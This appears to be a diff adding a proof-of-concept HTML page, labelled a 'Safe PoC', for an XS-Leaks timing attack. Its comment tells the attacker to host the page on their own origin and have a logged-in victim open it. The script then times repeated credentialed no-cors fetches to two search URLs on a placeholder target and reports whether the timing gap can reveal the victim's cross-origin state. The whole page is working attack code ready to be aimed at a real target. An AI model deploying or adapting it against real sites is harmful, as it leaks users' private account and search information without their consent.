@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<!--
+  Safe PoC -> x8bitranjit
+  XS-Leaks timing-oracle harness (XSL kit row 002). INERT: .invalid target.
+
+  WHAT TO EDIT: PROBE_URLS - two states of the same timing-variant endpoint
+  (calibrate with YOUR two accounts), measured N times, medians compared.
+
+  USE: host on YOUR origin; logged-in victim opens it -> the harness measures
+  no-cors credentialed fetch timings and reports separation. The QUESTIONS
+  this answers cross-origin: "is the victim in state A?" (exists-checks,
+  search result counts, per-record pages).
+-->
+<html>
+<body>
+<h3>Timing oracle harness</h3>
+<pre id="out">measuring...</pre>
+<script>
+// EDIT (calibrate with your own accounts):
+const PROBE_URLS = {
+  stateA: "https://target.example.invalid/search?q=common-term",
+  stateB: "https://target.example.invalid/search?q=xyzzynoresults"
+};
+const N = 40;
+
+async function timed(u) {
+  const t0 = performance.now();
+  await fetch(u, { mode: "no-cors", credentials: "include", cache: "no-store" });
+  return performance.now() - t0;
+}
+function median(a) { const s = [...a].sort((x,y)=>x-y); return s[s.length>>1]; }
+
+(async () => {
+  const A = [], B = [];
+  for (let i = 0; i < N; i++) { A.push(await timed(PROBE_URLS.stateA)); B.push(await timed(PROBE_URLS.stateB)); }
+  const mA = median(A), mB = median(B);
+  const sep = Math.abs(mA - mB) / Math.max(mA, mB);
+  document.getElementById("out").textContent =
+    `stateA median=${mA.toFixed(1)}ms  stateB median=${mB.toFixed(1)}ms  separation=${(sep*100).toFixed(0)}%\n` +
+    (sep > 0.15 ? "SEPARATION -> oracle usable (validate 3 runs, zero overlap)" : "no usable separation (or placeholder target)");
+})();
+</script>
+</body>
+</html>
